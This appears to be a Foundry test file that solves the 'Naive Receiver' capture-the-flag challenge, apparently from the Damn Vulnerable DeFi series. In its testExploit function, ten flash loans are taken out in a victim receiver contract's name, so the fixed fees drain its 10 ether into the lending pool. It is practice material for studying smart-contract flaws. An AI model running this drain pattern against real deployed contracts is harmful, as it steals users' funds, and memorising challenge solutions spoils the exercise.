// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiver is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;
    uint256 internal constant ETHER_IN_RECEIVER = 10e18;

    Utilities internal utils;
    NaiveReceiverLenderPool internal naiveReceiverLenderPool;
    FlashLoanReceiver internal flashLoanReceiver;
    address payable internal user;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        user = users[0];
        attacker = users[1];

        vm.label(user, "User");
        vm.label(attacker, "Attacker");

        naiveReceiverLenderPool = new NaiveReceiverLenderPool();
        vm.label(
            address(naiveReceiverLenderPool),
            "Naive Receiver Lender Pool"
        );
        vm.deal(address(naiveReceiverLenderPool), ETHER_IN_POOL);

        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
        assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);

        flashLoanReceiver = new FlashLoanReceiver(
            payable(naiveReceiverLenderPool)
        );
        vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
        vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);

        assertEq(address(flashLoanReceiver).balance, ETHER_IN_RECEIVER);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        // Here the pool when gives us ability to take flashloans from pool
        // It takes constant FEE of 1 ether. So as to when we want to empty the
        // NaiveReceiver's contract which contains 10 ether we can think of it as
        // when we pay flashloan back it takes 1 ether from NaiveReceiver so we can
        // call flashLoan but in receiveEther function it checks balance of the NaiveReceiver contract
        // which should be greater than loan to be repaid. So to drain the NaiveReceiver's contract
        // we can call flashloan 10 times which when repaid will drain the contract's ether as fee.
        for (int256 i = 0; i < 10; i++) {
            naiveReceiverLenderPool.flashLoan(
                address(flashLoanReceiver),
                10 ether
            );
        }

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // All ETH has been drained from the receiver
        assertEq(address(flashLoanReceiver).balance, 0);
        assertEq(
            address(naiveReceiverLenderPool).balance,
            ETHER_IN_POOL + ETHER_IN_RECEIVER
        );
    }
}
